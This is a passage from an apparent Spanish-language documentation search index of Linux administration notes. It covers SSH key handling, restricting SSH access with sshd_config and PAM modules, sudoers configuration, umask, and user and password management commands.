pc remoto o en f\u00edsico, si combinamos configuraci\u00f3n de ssh entrada libre a invitados y restringida a un usuario administrador mediante 1 ip \u00fanica. Modificar el fichero /etc/pam.d/sshd para que nos permita utilizar el fichero de accesos /etc/security/access.conf /etc/pam.d/sshd # Comentar la l\u00ednea (poniendo un # al inicio): #account required pam_nologin.so # Descomentar la l\u00ednea (quitando el # del inicio): account required pam_access.so Modificamos el fichero de accesos /etc/security/access.conf para permitir \u00fanicamente acceso al debian desde nuestra IP. A\u00f1adimos al final del mismo: --- +:debian:10.10.10.10 -:debian:ALL Donde 10.10.10.10 es nuestra IP, con la que accederemos al servidor SSH Donde -:debian:ALL niega a todas las dem\u00e1s ip\u2019s Servidor sshd El orden que se aplicaran las opciones en la configuraci\u00f3n del archivo sshd_config es: DenyUsers - AllowUser - DenyGroups - AllowGroup Estas opciones ir\u00e1n seguidas de una lista de usuarios o grupos separados por un espacio, solo los nombres est\u00e1n permitidos, si el patr\u00f3n forma user@host dar\u00e1 coincidencia, en un usuario en determinado host. AllowUsers pere marta AllowUsers pere@pc01.edt.org marta jordi@m06.cat --- DenyUsers jorge debian Con la siguiente l\u00ednea conseguimos lo mismo que la anterior pero dirigi\u00e9ndose al grupo que pertenecen. --- DenyGroups admin Con la siguiente l\u00ednea conseguimos que \u00fanicamente se pueda acceder al usuario debian mediante ssh. --- AllowUsers debian Con la siguiente l\u00ednea conseguimos que \u00fanicamente se pueda acceder a los usuarios que pertenezcan a admin. --- AllowGroups admin Pam Pam_access Con el modulo de pam pam_access.so , se puede restringir el acceso, modificando el archivo access.conf /etc/pam.d/sshd #%PAM-1.0 auth substack password-auth auth include postlogin account required pam_sepermit.so account required pam_nologin.so account required pam_access.so accessfile = /etc/security/access.conf account include password-auth password include password-auth # pam_selinux.so close should be the first session rule session required pam_selinux.so close session required pam_loginuid.so # pam_selinux.so open should only be followed by sessions to be executed in the user context session required pam_selinux.so open env_params session required pam_namespace.so session optional pam_keyinit.so force revoke session include password-auth session include postlogin /etc/security/access.conf # All other users should be denied to get access from all sources. #- : ALL : ALL # denegar a local2 el aceso a todo - : local2 : ALL Algunos ejemplos de access.conf # permiso : usuario/s : servicio/s : host + : root : crond :0 tty1 tty2 tty3 tty4 tty5 tty6 + : root : 192 .168.200.1 192 .168.200.4 192 .168.200.9 + : root : 127 .0.0.1 #El usuario root deber\u00eda tener acceso desde la red 192.168.201. donde el t\u00e9rmino se evaluar\u00e1 mediante la coincidencia de cadenas. Pero podr\u00eda ser mejor usar network / netmask en su lugar. El mismo significado de 192.168.201. es 192.168.201.0/24 o 192.168.201.0/255.255.255.0. + : root : 192 .168.201. + : root : foo1.bar.org foo2.bar.org - : root : ALL # Los usuarios y los miembros de los administradores de netgroup deben tener acceso a todas las fuentes. Esto solo funcionar\u00e1 si el servicio netgroup est\u00e1 disponible. + : @admins foo : ALL # User john and foo should get access from IPv6 host address. + : john foo : 2001 :db8:0:101::1 - : ALL : ALL Pam_listfile Con el modulo pam_listfile.so se puede restringir o dar acceso a diferentes usuarios. pam_listfile.so item =[ tty | user | rhost | ruser | group | shell ] sense =[ allow | deny ] file = /path/filename onerr =[ succeed | fail ] [ apply =[ user | @group ]] [ quiet ] En el fichero sshd de pam, especificamos que tipo de datos encontrara en el archivo que le indicaremos en ruta. item : que tipo de dato encontrar\u00e1 sense : que hacer. file : ruta del archivo. /etc/pam.d/sshd #%PAM-1.0 auth substack password-auth auth include postlogin account required pam_sepermit.so account required pam_nologin.so account required pam_listfile.so item = user sense = allow file = /etc/security/users.conf account include password-auth password include password-auth # pam_selinux.so close should be the first session rule session required pam_selinux.so close session required pam_loginuid.so # pam_selinux.so open should only be followed by sessions to be executed in the user context session required pam_selinux.so open env_params session required pam_namespace.so session optional pam_keyinit.so force revoke session include password-auth session include postlogin /etc/security/users.conf local1 local2 clusterssh Para intalar/gestionar pc's desde consola Lo que haces lo transmite a todos a la vez. Instalar dnf -y install clusterssh Comando cssh Ejemplos cssh root a01 a02 a03 a04 cssh root@a [ 01 -35 ] Arxiu de configuraci\u00f3 d'alies de cluster Ejemplo crear un grupo: /etc/clusters f2a a01 a02 a03 a04 Ejecutar el grupo se ejecutar\u00e1n todos los hosts indicados en el grupo seleccionada. sudo cssh -l root \"f2a\"","title":"ssh"},{"location":"administracion/ssh/#ssh","text":"Ssh funciona con parejas de claves p\u00fablica, privada, para una conexi\u00f3n entre hosts. tipos de clave: rsa, dsa,... Al instalarse los paquetes openssh-client, openssh-server directamente se generan las claves de host. Nota: En docker no, se tiene que indicar con ssh-keygen -A para generar las claves de host.","title":"ssh"},{"location":"administracion/ssh/#claves","text":"Las claves privadas tendr\u00e1n unos permisos de 0600 mientras que las p\u00fablicas 0644 -rw------- 1 debian debian 1 ,8K jun 17 10 :11 id_rsa -rw-r--r-- 1 debian debian 393 jun 17 10 :11 id_rsa.pub -rw------- 1 debian debian 5 ,2K dic 10 18 :09 known_hosts -rw------- 1 debian debian 5 ,2K dic 10 18 :11 authorized_keys","title":"Claves"},{"location":"administracion/ssh/#host","text":"Las claves de host est\u00e1n en /etc/ssh/ junto a la configuraci\u00f3n.","title":"Host"},{"location":"administracion/ssh/#usuario","text":"Las claves de usuario se encuentran en ~/.ssh/ known_host : claves publicas de hosts authoriced_keys : claves publicas de usuarios","title":"Usuario"},{"location":"administracion/ssh/#autenticacion","text":"La autentificaci\u00f3n la hace en dos pasos, identificar el host y despu\u00e9s el usuario.","title":"Autenticaci\u00f3n"},{"location":"administracion/ssh/#host_1","text":"Host , es el primero en autenticar, al establecer conexi\u00f3n el remoto env\u00eda su fingerprint al local y le pregunta si es con el realmente si quiere conectar, si es cierto el remoto env\u00eda su clave p\u00fablica al local. Ejemplo fingerprint. ssh-keygen -l -f /etc/ssh/ssh_host_rsa_key.pub 2048 SHA256:rY7+fOVHZ0PAab05HhBwGht0ZdFN60nCucU/xeXT2Mg no comment ( RSA ) Una vez aceptada la conexi\u00f3n el host remoto guarda la clave publica en .ssh/know-host","title":"Host"},{"location":"administracion/ssh/#usuario_1","text":"Usuario es el segundo en autenticarse, y se puede hacer manualmente, a\u00f1adiendo la contrase\u00f1a en cada conexi\u00f3n, o autom\u00e1ticamente, con una clave p\u00fablica de usuario que se guardare el remoto en .ssh/autorized_keys ssh-keygen # generar clave ssh-copy-id local2@172.20.0.3 # enviar al remoto Tambi\u00e9n se puede copiar la clave p\u00fablica (cuidado en no reescribirla) scp .ssh/id_rsa.pub local1@172.20.0.3:.ssh/authorized_keys","title":"Usuario"},{"location":"administracion/ssh/#transferencia-de-archivos","text":"# genera archivo file local del resultado ls -la remoto ssh local1@172.20.0.3 ls -la > file.txt # genera todo remotamente ssh local1@172.20.0.3 \"ls -la > file.txt\" # comprimir localmente y guarda en remoto tar cvf - /boot | ssh local1@172.20.0.3 \"cat - > boot.tar\" # sshfs sshfs local1@172.20.0.3: /tmp/mnt fusermount -u /tmp/mnt # desde nautilus sftp://local1@172.20.0.3/home/local1","title":"Transferencia de archivos"},{"location":"administracion/ssh/#cliente","text":"El cliente ssh tiene 3 propiedades de configuraci\u00f3n. Global es la que menos prioridad tiene, si una orden se duplica en la configuraci\u00f3n de usuario, se aplicar\u00e1 la del usuario. lo mismo pasa con comand line, esta es la que mas prioridad tiene. comand line user config ~/.ssh/config global /etc/ssh/ssh_config Host localhost VisualHostKey no Host * VisualHostKey yes Host 192 .168.80.252 VisualHostKey no PasswordAuthentication no Si un host coincide en distintos filtros, se le aplica el que mas se parezca.","title":"Cliente"},{"location":"administracion/ssh/#servidor","text":"/etc/ssh/sshd_conf /var/run/sshd.pid port 2022 listenAdress <ip por donde entrar> MaxSessions MaxAuthTries numero de intentos de poner password -1 UsePam En el caso en el que coincidan 2 configuraciones de host y user en una conexi\u00f3n, se aplica el primero que encuentra. # sshd_config Match Host 172 .19.0.1 banner /etc/banner Match user local2 banner /etc/banner2 ssh local2@172.19.0.2 baner1 Reload servicio kill -1 <num-servicio>","title":"Servidor"},{"location":"administracion/ssh/#restricciones","text":"Existen m\u00faltiples mecanismos de restricci\u00f3n para el acceso ssh, algunos de ellos, son globales para los servicios de red y otros espec\u00edficos de sshd. Mecanismos de restricci\u00f3n: configuraci\u00f3n del servidor sshd. Configuraci\u00f3n de reglas de PAM Utilizar TCP Wrappers con los ficheros host.allow y host.deny de la configuraci\u00f3n global del sistema. Creaci\u00f3n de Firewalls con iptables.","title":"Restricciones"},{"location":"administracion/ssh/#acceder-solo-desde-1-ip-a-un-usuario","text":"Esto nos puede servir para configurar remotamente un servidor con la seguridad de que solo se podr\u00e1 hacer mediante 1 pc remoto o en f\u00edsico, si combinamos configuraci\u00f3n de ssh entrada libre a invitados y restringida a un usuario administrador mediante 1 ip \u00fanica. Modificar el fichero /etc/pam.d/sshd para que nos permita utilizar el fichero de accesos /etc/security/access.conf /etc/pam.d/sshd # Comentar la l\u00ednea (poniendo un # al inicio): #account required pam_nologin.so # Descomentar la l\u00ednea (quitando el # del inicio): account required pam_access.so Modificamos el fichero de accesos /etc/security/access.conf para permitir \u00fanicamente acceso al debian desde nuestra IP. A\u00f1adimos al final del mismo: --- +:debian:10.10.10.10 -:debian:ALL Donde 10.10.10.10 es nuestra IP, con la que accederemos al servidor SSH Donde -:debian:ALL niega a todas las dem\u00e1s ip\u2019s","title":"Acceder solo desde 1 ip a un usuario."},{"location":"administracion/ssh/#servidor-sshd","text":"El orden que se aplicaran las opciones en la configuraci\u00f3n del archivo sshd_config es: DenyUsers - AllowUser - DenyGroups - AllowGroup Estas opciones ir\u00e1n seguidas de una lista de usuarios o grupos separados por un espacio, solo los nombres est\u00e1n permitidos, si el patr\u00f3n forma user@host dar\u00e1 coincidencia, en un usuario en determinado host. AllowUsers pere marta AllowUsers pere@pc01.edt.org marta jordi@m06.cat --- DenyUsers jorge debian Con la siguiente l\u00ednea conseguimos lo mismo que la anterior pero dirigi\u00e9ndose al grupo que pertenecen. --- DenyGroups admin Con la siguiente l\u00ednea conseguimos que \u00fanicamente se pueda acceder al usuario debian mediante ssh. --- AllowUsers debian Con la siguiente l\u00ednea conseguimos que \u00fanicamente se pueda acceder a los usuarios que pertenezcan a admin. --- AllowGroups admin","title":"Servidor sshd"},{"location":"administracion/ssh/#pam","text":"","title":"Pam"},{"location":"administracion/ssh/#pam_access","text":"Con el modulo de pam pam_access.so , se puede restringir el acceso, modificando el archivo access.conf /etc/pam.d/sshd #%PAM-1.0 auth substack password-auth auth include postlogin account required pam_sepermit.so account required pam_nologin.so account required pam_access.so accessfile = /etc/security/access.conf account include password-auth password include password-auth # pam_selinux.so close should be the first session rule session required pam_selinux.so close session required pam_loginuid.so # pam_selinux.so open should only be followed by sessions to be executed in the user context session required pam_selinux.so open env_params session required pam_namespace.so session optional pam_keyinit.so force revoke session include password-auth session include postlogin /etc/security/access.conf # All other users should be denied to get access from all sources. #- : ALL : ALL # denegar a local2 el aceso a todo - : local2 : ALL Algunos ejemplos de access.conf # permiso : usuario/s : servicio/s : host + : root : crond :0 tty1 tty2 tty3 tty4 tty5 tty6 + : root : 192 .168.200.1 192 .168.200.4 192 .168.200.9 + : root : 127 .0.0.1 #El usuario root deber\u00eda tener acceso desde la red 192.168.201. donde el t\u00e9rmino se evaluar\u00e1 mediante la coincidencia de cadenas. Pero podr\u00eda ser mejor usar network / netmask en su lugar. El mismo significado de 192.168.201. es 192.168.201.0/24 o 192.168.201.0/255.255.255.0. + : root : 192 .168.201. + : root : foo1.bar.org foo2.bar.org - : root : ALL # Los usuarios y los miembros de los administradores de netgroup deben tener acceso a todas las fuentes. Esto solo funcionar\u00e1 si el servicio netgroup est\u00e1 disponible. + : @admins foo : ALL # User john and foo should get access from IPv6 host address. + : john foo : 2001 :db8:0:101::1 - : ALL : ALL","title":"Pam_access"},{"location":"administracion/ssh/#pam_listfile","text":"Con el modulo pam_listfile.so se puede restringir o dar acceso a diferentes usuarios. pam_listfile.so item =[ tty | user | rhost | ruser | group | shell ] sense =[ allow | deny ] file = /path/filename onerr =[ succeed | fail ] [ apply =[ user | @group ]] [ quiet ] En el fichero sshd de pam, especificamos que tipo de datos encontrara en el archivo que le indicaremos en ruta. item : que tipo de dato encontrar\u00e1 sense : que hacer. file : ruta del archivo. /etc/pam.d/sshd #%PAM-1.0 auth substack password-auth auth include postlogin account required pam_sepermit.so account required pam_nologin.so account required pam_listfile.so item = user sense = allow file = /etc/security/users.conf account include password-auth password include password-auth # pam_selinux.so close should be the first session rule session required pam_selinux.so close session required pam_loginuid.so # pam_selinux.so open should only be followed by sessions to be executed in the user context session required pam_selinux.so open env_params session required pam_namespace.so session optional pam_keyinit.so force revoke session include password-auth session include postlogin /etc/security/users.conf local1 local2","title":"Pam_listfile"},{"location":"administracion/ssh/#clusterssh","text":"Para intalar/gestionar pc's desde consola Lo que haces lo transmite a todos a la vez. Instalar dnf -y install clusterssh Comando cssh Ejemplos cssh root a01 a02 a03 a04 cssh root@a [ 01 -35 ] Arxiu de configuraci\u00f3 d'alies de cluster Ejemplo crear un grupo: /etc/clusters f2a a01 a02 a03 a04 Ejecutar el grupo se ejecutar\u00e1n todos los hosts indicados en el grupo seleccionada. sudo cssh -l root \"f2a\"","title":"clusterssh"},{"location":"administracion/sudo/","text":"sudo https://fedoraproject.org/wiki/Configuring_Sudo http://www.mjmwired.net/resources/mjm-fedora-f19.html#sudo Sudo nos permite acceder a comandos de root, es perfecto para usuario administrador. sudo con periodo de gracia A\u00f1adiendo la siguiente linea al archivo /etc/sudoers permitira hacer sudo y pedira la contrase\u00f1a de usuario, no de ( root ) . Puedes editar con gedit, nano, vim, etc.. o a\u00f1adirla con un echo. echo 'username ALL=(ALL) ALL' >> /etc/sudoers cambiar username por ombre de usuario. Tiene un periodo de gracia hasta que vuelve a pedir la contrase\u00f1a. sudo permisivo En ocasiones no quieres que sudo pida contrase\u00f1a, como por ejemplo entorno de prueba, en casa, etc.. echo 'username ALL=(ALL) NOPASSWD:ALL' >> /etc/sudoers sudo estricto Hay casos que quieres que sudo sea mas estrito y pida la contrase\u00f1a cada vez que se ejecuta, en ese caso tenemos que modificar /etc/sudoers de la siguiente manera. Reducir periodo de gracia a 0 echo 'username ALL=(ALL) ALL' >> /etc/sudoers echo 'Defaults:ALL timestamp_timeout=0' >> /etc/sudoers A\u00f1adir usuario a wheel La manera mas correcta de permitir a un usuario ser administrador del sistema es a\u00f1adirlo al grupo wheel. Y despues reiniciar. usermod username -a -G wheel # o tambi\u00e9n gpasswd -a username wheel Wheel permisivo Quitar comentario \u201c#\u201d a la l\u00ednia /etc/sudoers --- %wheel ALL =( ALL ) NOPASSWD: ALL # A\u00f1adir \u201c#\u201d a la l\u00ednia: %wheel ALL =( ALL ) ALL: ALL --- Wheel normal /etc/sudoers --- %wheel ALL =( ALL ) ALL: ALL ---","title":"sudo"},{"location":"administracion/sudo/#sudo","text":"https://fedoraproject.org/wiki/Configuring_Sudo http://www.mjmwired.net/resources/mjm-fedora-f19.html#sudo Sudo nos permite acceder a comandos de root, es perfecto para usuario administrador.","title":"sudo"},{"location":"administracion/sudo/#sudo-con-periodo-de-gracia","text":"A\u00f1adiendo la siguiente linea al archivo /etc/sudoers permitira hacer sudo y pedira la contrase\u00f1a de usuario, no de ( root ) . Puedes editar con gedit, nano, vim, etc.. o a\u00f1adirla con un echo. echo 'username ALL=(ALL) ALL' >> /etc/sudoers cambiar username por ombre de usuario. Tiene un periodo de gracia hasta que vuelve a pedir la contrase\u00f1a.","title":"sudo con periodo de gracia"},{"location":"administracion/sudo/#sudo-permisivo","text":"En ocasiones no quieres que sudo pida contrase\u00f1a, como por ejemplo entorno de prueba, en casa, etc.. echo 'username ALL=(ALL) NOPASSWD:ALL' >> /etc/sudoers","title":"sudo permisivo"},{"location":"administracion/sudo/#sudo-estricto","text":"Hay casos que quieres que sudo sea mas estrito y pida la contrase\u00f1a cada vez que se ejecuta, en ese caso tenemos que modificar /etc/sudoers de la siguiente manera. Reducir periodo de gracia a 0 echo 'username ALL=(ALL) ALL' >> /etc/sudoers echo 'Defaults:ALL timestamp_timeout=0' >> /etc/sudoers","title":"sudo estricto"},{"location":"administracion/sudo/#anadir-usuario-a-wheel","text":"La manera mas correcta de permitir a un usuario ser administrador del sistema es a\u00f1adirlo al grupo wheel. Y despues reiniciar. usermod username -a -G wheel # o tambi\u00e9n gpasswd -a username wheel","title":"A\u00f1adir usuario a wheel"},{"location":"administracion/sudo/#wheel-permisivo","text":"Quitar comentario \u201c#\u201d a la l\u00ednia /etc/sudoers --- %wheel ALL =( ALL ) NOPASSWD: ALL # A\u00f1adir \u201c#\u201d a la l\u00ednia: %wheel ALL =( ALL ) ALL: ALL ---","title":"Wheel permisivo"},{"location":"administracion/sudo/#wheel-normal","text":"/etc/sudoers --- %wheel ALL =( ALL ) ALL: ALL ---","title":"Wheel normal"},{"location":"administracion/umask/","text":"umask Es la m\u00e1scara simb\u00f3lica de permisos que tiene un archivo o directorio por defecto. tiene 2 formas de cambiarse. m\u00e1scara de directorios tiene valor de 777 m\u00e1scara de archivos tiene valor de 666 Modo simb\u00f3lico. umask u = rwx,g = rwx,o = <archivo> d rwx rwx --- 2 dave 512 Sep 1 20 :59 foo - rw- rw- --- 1 dave 0 Sep 1 20 :59 bar Modo octal ( solo v\u00e1lida en la sesi\u00f3n actual ) El octal funciona justo al rev\u00e9s que chmod colocas los n\u00fameros en funci\u00f3n de lo que quieres quitar. umask 0174 d rw- --- -wx 2 dave 512 Sep 1 20 :59 foo - rw- --- -w- 1 dave 0 Sep 1 20 :59 bar Para configurar el valor de umask por defecto para un usuario en concreto hay que a\u00f1adir en el fichero .bashrc_profile el comando umask 077, peor adem\u00e1s tambi\u00e9n se puede modificar el valor de umask en el fichero global /etc/profile para que el cambio sea efectivo para todos los usuarios. Evitar cambio de m\u00e1scara en el copiado Para evitar el cambio tenemos que hacer un cp -p y preservara la m\u00e1scara por defecto como estaba. cp -p archivo archivo ( copiado )","title":"umask"},{"location":"administracion/umask/#umask","text":"Es la m\u00e1scara simb\u00f3lica de permisos que tiene un archivo o directorio por defecto. tiene 2 formas de cambiarse. m\u00e1scara de directorios tiene valor de 777 m\u00e1scara de archivos tiene valor de 666 Modo simb\u00f3lico. umask u = rwx,g = rwx,o = <archivo> d rwx rwx --- 2 dave 512 Sep 1 20 :59 foo - rw- rw- --- 1 dave 0 Sep 1 20 :59 bar Modo octal ( solo v\u00e1lida en la sesi\u00f3n actual ) El octal funciona justo al rev\u00e9s que chmod colocas los n\u00fameros en funci\u00f3n de lo que quieres quitar. umask 0174 d rw- --- -wx 2 dave 512 Sep 1 20 :59 foo - rw- --- -w- 1 dave 0 Sep 1 20 :59 bar Para configurar el valor de umask por defecto para un usuario en concreto hay que a\u00f1adir en el fichero .bashrc_profile el comando umask 077, peor adem\u00e1s tambi\u00e9n se puede modificar el valor de umask en el fichero global /etc/profile para que el cambio sea efectivo para todos los usuarios. Evitar cambio de m\u00e1scara en el copiado Para evitar el cambio tenemos que hacer un cp -p y preservara la m\u00e1scara por defecto como estaba. cp -p archivo archivo ( copiado )","title":"umask"},{"location":"administracion/usuarios/","text":"Usuarios Todo usuario tiene un UID y un GID n\u00ba grupo principal. Opcionalmente puede pertenecer a x grupos secundarios. las opciones por defecto se encuentra en /etc/login.defs Archivos de configuraci\u00f3n Creaci\u00f3n ( add del mod ) /etc/passwd /etc/group /etc/default/useradd /etc/login.defs /etc/shells /etc/skel ~/.bashlogout acciones que quiero que haga cuando cierro sessi\u00f3n del usuario ~/.bash_profile carga las opciones especificas del usuario contiene variables de entorno y startup programs ( programas que ejecutara al acceder a la sesi\u00f3n ) variables que han de perdurar, si queremos que perduren en subsesiones se han de exportar dentro del archivo. programas que arrancar al iniciar sesion ~/.bashrc contiene las alias y funciones especificas del usuario /etc/bashrc alias y funciones de todos los usuarios del sistema /etc/profile contiene los startups y las variables globales del sistema /etc/profile.d - las configuraciones personales para todos los usuarios en un script.sh Un directorio acabado en .d significa que es un dirtectorio que contiene configuraciones usuario /etc/passwd cada linea es la informaci\u00f3n de un usuario login:passwd:Uid:GID:gecos:home:shell Al crear un usuario siempre se crea y luego se a\u00f1ade la pasword, si quieres una sesi\u00f3n interactiva. por defecto asigna home de usuario en el directorio home del sistema RH(fedora) por defecto crea los usuarios en un grupo propio el archivo passwd solo guarda el grupo principal del usuario grupo /etc/group almacena la informaci\u00f3n de cada grupo gname:contrase\u00f1a:gid:lista de usuarios El \u00faltimo campo de cada l\u00ednea guarda que usuarios pertenecen a dicho grupo como secundario. ejemplo: /etc/group sudo:x:27:debian id debian uid = 1000 ( debian ) gid = 1000 ( debian ) grupos = 1000 ( debian ) ,27 ( sudo ) ,999 ( docker ) el usuario debian tiene como secundario el grupo sudo y en el archivo group lo muestra como se ve en el paso anterior. passwords Se almacenan en /etc/shasow todas las fechas unix empiezan en 1 de enero de 1970 login_name:Pasword:last:min:max:warning:inactiviti_period:expiracion_cuenta:uso_futuro last : fecha_ultimo_cambio. 0 obliga a cambiar password y si es un numero, numero de dias desde 1970 min : dias_para_poder_cambiar_password desde el dia impuesto. campo en 0 o vacio no hay m\u00ednimo. max : maximo tiempo para cambiar el password, si no te obliga a cambiar. Entre min y max es el periodo que debes cambiar password una vez pasado max te obligara. campo vacio periodo infinito. warning : dias de aviso para cambiar el password respecto al max, x dias antres avisa que deves cambiar pasword antes que caduque. campo en 0 no hay periodo de aviso. inactiviti period : dias de periodo de gracia que podras cambiarte el password, una vez pasado max. valor 0 infinito. campo vacio no hay periodo extra. expiracion cuenta : dias para la expiracion de cuenta, una vez finalizado bloqueara el usuario no podra acceder ni poner contrase\u00f1a, solo admin podra activarlo. Explicaci\u00f3n gr\u00e1fica: period min warning +------+ +---------+ +-------+ | +-----------------------------------------------------------+ + + passwd max Una vez puesta la password, en el periodo min no se podra cambiar la password, en el periodo warning te avisara que deves cambiar, una vez finalizado el periodo de warning te obligara a cambiar la password mientras estes dentro del periodo period. una vez finalizado period no podras acceder a tu sessi\u00f3n y sera un admin quien te adjunte una nueva pasword. Las contrase\u00f1as se \"encriptan\" con un algoritmo que no tiene reversi\u00f3n, la manera de autentificaci\u00f3n es a\u00f1adiendo un texto, este se encripta y si coincide con el encriptado anterior es que la contrase\u00f1a es correcta. passwd -S user # informacion pasword usuario chage -l user # lo mismo mas bonito passwd -l user # bloquear usuario :!!passwd: passwd -u user # desbloquear passwd -d user # dejar usuartio sin passwd :: chage -m 2 user # user podra cambiar password de aqui a 2 dias chage -M 5 user # password caducara en 5 dias chage -W 2 user # periodo de dias que avisa para cambiar el password chage -I 3 user # establecer periodo de gracia en 3 dias chage -E 2 user # expiracion cuenta de user en 2 dias chage -E YYYY-MM-DD user # expiracion cuenta de user en dia indicado chage -E -1 user # desbloquear user que a expirado y esta bloqueado Crear, eliminar y modificar Crear Al crear un usuario por defecto se crea: la cuenta, una password, se crear home y mail opciones m\u00e1s comunes. useradd user -s /bin/sh # shell especifica -p password # pasword especifica -g gid # gid o nombre del grupo -d /home/user # destino home dir especifico -b /home # destino home dir en basedir -u uid # uid especifico -G grupo1,grupo2 # grupos secundarios -m # asegurar que crea homedir -N # crear con grupo default ( no con el propio ) -m -k /etc/skel-propio # crear usuario con esqueleto propio Default useradd -D opcioners por defecto al crear un usuario Las opciones se guardan en /etc/default/useradd Esqueleto Al crear un directorio de usuario se crea el esqueleto por defecto y ese esqueleto se encuentra en /etc/skel Si tenemos diferentes tipos de usuarios a veces queremos que tengan distintos esqueletos de home, podemos asignar manualmente al crear el usuario o cambiarlo por defecto. Al crear usuario: se crea la cuenta en /etc/passwd se crea el grupo en /etc/group se crea el mail en /var/spool/mail/ login.defs /etc/login.defs fichero de configuraci\u00f3n de login guarda datos de: password,num maximo y minimo de usuarios, grupos autistas o por defect, home por defecto, umask, encriptacion, mail. formatos encryptacion: SHA512 MD5 Borrar La opci\u00f3n userdel -r borra la cuenta, grupo primario si no es primario en otro user, el home y el mail. Pero para hacerlo correctamente debemos considerar diferentes aspectos. home si se quiere hacer una backup de ese home, para un futuro. mail si nel mail nos interesa conservarlo. archivos y directorios del usuario repartidos por el sistema, hacer backups o borrar, etc.. procesos en marcha siempre hay que matarlos, por posible malware intencionado. impresion trabajos de impresion es posible que se quieran guardar, podr\u00eda haber algo importante. Para estas acciones extra se puede crear un script que al ejecutar userdel se inicialize automaticamente. La opci\u00f3n la encontramos en /etc/login.defs . ... USERDEL_CMD /usr/sbin/script ... borrar usuario y sus datos userdel -r user Modificar Al modificar utilizamos las mismas opciones que creando, excepto en par\u00e1metros m\u00faltiples que a\u00f1ades -a (append) a no ser que quieras reescribir. usermod user -G grupo # indica que grupos secundarios pertenecera ( se come los anteriores ) -aG grupo # a\u00f1ade grupo secundario chfn cambiar informacion usuario El mismo usuario no podra cambiar la informacion de usuario a no ser que en /etc/login.defs este CHFN_RESTRICT yes . lo que si podra hacer es editar la informaci\u00f3n adicional de finger, desde .plan donde se inserta en formato texto. ver shells del sistema. cat /etc/shells","title":"Usuarios"},{"location":"administracion/usuarios/#usuarios","text":"Todo usuario tiene un UID y un GID n\u00ba grupo principal. Opcionalmente puede pertenecer a x grupos secundarios. las opciones por defecto se encuentra en /etc/login.defs","title":"Usuarios"},{"location":"administracion/usuarios/#archivos-de-configuracion","text":"Creaci\u00f3n ( add del mod ) /etc/passwd /etc/group /etc/default/useradd /etc/login.defs /etc/shells /etc/skel ~/.bashlogout acciones que quiero que haga cuando cierro sessi\u00f3n del usuario ~/.bash_profile carga las opciones especificas del usuario contiene variables de entorno y startup programs ( programas que ejecutara al acceder a la sesi\u00f3n ) variables que han de perdurar, si queremos que perduren en subsesiones se han de exportar dentro del archivo. programas que arrancar al iniciar sesion ~/.bashrc contiene las alias y funciones especificas del usuario /etc/bashrc alias y funciones de todos los usuarios del sistema /etc/profile contiene los startups y las variables globales del sistema /etc/profile.d - las configuraciones personales para todos los usuarios en un script.sh Un directorio acabado en .d significa que es un dirtectorio que contiene configuraciones","title":"Archivos de configuraci\u00f3n"},{"location":"administracion/usuarios/#usuario","text":"/etc/passwd cada linea es la informaci\u00f3n de un usuario login:passwd:Uid:GID:gecos:home:shell Al crear un usuario siempre se crea y luego se a\u00f1ade la pasword, si quieres una sesi\u00f3n interactiva. por defecto asigna home de usuario en el directorio home del sistema RH(fedora) por defecto crea los usuarios en un grupo propio el archivo passwd solo guarda el grupo principal del usuario","title":"usuario"},{"location":"administracion/usuarios/#grupo","text":"/etc/group almacena la informaci\u00f3n de cada grupo gname:contrase\u00f1a:gid:lista de usuarios El \u00faltimo campo de cada l\u00ednea guarda que usuarios pertenecen a dicho grupo como secundario. ejemplo: /etc/group sudo:x:27:debian id debian uid = 1000 ( debian ) gid = 1000 ( debian ) grupos = 1000 ( debian ) ,27 ( sudo ) ,999 ( docker ) el usuario debian tiene como secundario el grupo sudo y en el archivo group lo muestra como se ve en el paso anterior.","title":"grupo"},{"location":"administracion/usuarios/#passwords","text":"Se almacenan en /etc/shasow todas las fechas unix empiezan en 1 de enero de 1970 login_name:Pasword:last:min:max:warning:inactiviti_period:expiracion_cuenta:uso_futuro last : fecha_ultimo_cambio. 0 obliga a cambiar password y si es un numero, numero de dias desde 1970 min : dias_para_poder_cambiar_password desde el dia impuesto. campo en 0 o vacio no hay m\u00ednimo. max : maximo tiempo para cambiar el password, si no te obliga a cambiar. Entre min y max es el periodo que debes cambiar password una vez pasado max te obligara. campo vacio periodo infinito. warning : dias de aviso para cambiar el password respecto al max, x dias antres avisa que deves cambiar pasword antes que caduque. campo en 0 no hay periodo de aviso. inactiviti period : dias de periodo de gracia que podras cambiarte el password, una vez pasado max. valor 0 infinito. campo vacio no hay periodo extra. expiracion cuenta : dias para la expiracion de cuenta, una vez finalizado bloqueara el usuario no podra acceder ni poner contrase\u00f1a, solo admin podra activarlo. Explicaci\u00f3n gr\u00e1fica: period min warning +------+ +---------+ +-------+ | +-----------------------------------------------------------+ + + passwd max Una vez puesta la password, en el periodo min no se podra cambiar la password, en el periodo warning te avisara que deves cambiar, una vez finalizado el periodo de warning te obligara a cambiar la password mientras estes dentro del periodo period. una vez finalizado period no podras acceder a tu sessi\u00f3n y sera un admin quien te adjunte una nueva pasword. Las contrase\u00f1as se \"encriptan\" con un algoritmo que no tiene reversi\u00f3n, la manera de autentificaci\u00f3n es a\u00f1adiendo un texto, este se encripta y si coincide con el encriptado anterior es que la contrase\u00f1a es correcta. passwd -S user # informacion pasword usuario chage -l user # lo mismo mas bonito passwd -l user # bloquear usuario :!!passwd: passwd -u user # desbloquear passwd -d user # dejar usuartio sin passwd :: chage -m 2 user # user podra cambiar password de aqui a 2 dias chage -M 5 user # password caducara en 5 dias chage -W 2 user # periodo de dias que avisa para cambiar el password chage -I 3 user # establecer periodo de gracia en 3 dias chage -E 2 user # expiracion cuenta de user en 2 dias chage -E YYYY-MM-DD user # expiracion cuenta de user en dia indicado chage -E -1 user # desbloquear user que a expirado y esta bloqueado","title":"passwords"},{"location":"administracion/usuarios/#crear-eliminar-y-modificar","text":"","title":"Crear, eliminar y modificar"},{"location":"administracion/usuarios/#crear","text":"Al crear un usuario por defecto se crea: la cuenta, una password, se crear home y mail opciones m\u00e1s comunes. useradd user -s /bin/sh # shell especifica -p password # pasword especifica -g gid # gid o nombre del grupo -d /home/user # destino home dir especifico -b /home # destino home dir en basedir -u uid # uid especifico -G grupo1,grupo2 # grupos secundarios -m # asegurar que crea homedir -N # crear con grupo default ( no con el propio ) -m -k /etc/skel-propio # crear usuario con esqueleto propio","title":"Crear"},{"location":"administracion/usuarios/#default","text":"useradd -D opcioners por defecto al crear un usuario Las opciones se guardan en /etc/default/useradd","title":"Default"},{"location":"administracion/usuarios/#esqueleto","text":"Al crear un directorio de usuario se crea el esqueleto por 